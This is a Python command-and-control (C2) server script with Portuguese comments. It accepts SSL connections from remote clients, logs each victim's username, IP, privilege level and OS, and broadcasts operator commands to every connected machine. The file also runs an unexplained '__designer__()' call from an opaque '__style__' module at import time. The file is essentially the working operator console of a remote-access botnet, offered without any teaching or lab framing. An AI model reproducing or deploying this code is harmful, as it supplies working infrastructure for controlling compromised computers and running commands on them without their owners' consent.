import socket
import select
import threading
import json
import ssl
import os
from __style__ import __designer__
__designer__()  # STYLE

# Configurações do servidor
SERVER_HOST = '192.168.247.28'
SERVER_PORT = 7070
# Caminho para os arquivos de certificado
CERT_FILE = 'server.crt'
KEY_FILE = 'server.key'

clients = []
def start_server():
    # Criar socket padrão
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Envolver o socket com SSL
    server_socket = ssl.wrap_socket(server_socket, certfile=CERT_FILE, keyfile=KEY_FILE, server_side=True)

    server_socket.bind((SERVER_HOST, SERVER_PORT))
    server_socket.listen(5)
    print(f'\n\33[1m\33[92m SERVIDOR-C2 ON (SSL) - \33[96m{SERVER_HOST}\33[92m:\33[96m{SERVER_PORT}\33[92m')

    # Criar uma thread para receber comandos do usuário
    threading.Thread(target=user_input, daemon=True).start()

    while True:
        readable, _, _ = select.select([server_socket] + clients, [], [])
        for s in readable:
            if s is server_socket:
                # Aceitar nova conexão
                client_socket, addr = server_socket.accept()
                clients.append(client_socket)
                print(f'\33[1m\33[92m  CLIENTE:\33[96m {addr}')
                # Receber informações do cliente
                receive_client_info(client_socket)
            else:
                try:
                    datas = s.recv(4096).decode()
                    if datas:
                        print(f"\n {datas}")
                    else:
                        clients.remove(s)
                        s.close()
                except Exception as e:
                    print(f" Erro: {e}")
                    clients.remove(s)
                    s.close()

def receive_client_info(client_socket):
    try:
        info_data = client_socket.recv(4096).decode()
        client_info = json.loads(info_data)
        print(f"\33[1m\33[92m  ID:\33[96m {client_info['id']}\33[92m    |    IP:\33[96m {client_info['ip']}\33[92m    |    ACESSO:\33[96m {client_info['access_level']}\33[0m")
        print(f"\33[1m\33[92m  USERNAME:\33[96m {client_info['username']}\33[92m    |    SISTEMA:\33[96m {client_info['os_version']}\33[0m\n")
    except Exception as e:
        print(f" Erro ao receber informações do cliente: {e}")

def user_input():
    while True:
        if clients:
            try:
                command = input("\33[1m\33[92m {\33[96m SEND-COMMAND\33[92m } >\33[96m ")
                for client_socket in clients:
                    send_command(client_socket, command)
            except EOFError:
                pass

def send_command(client_socket, command):
    client_socket.sendall(command.encode())

if __name__ == "__main__":
    start_server()
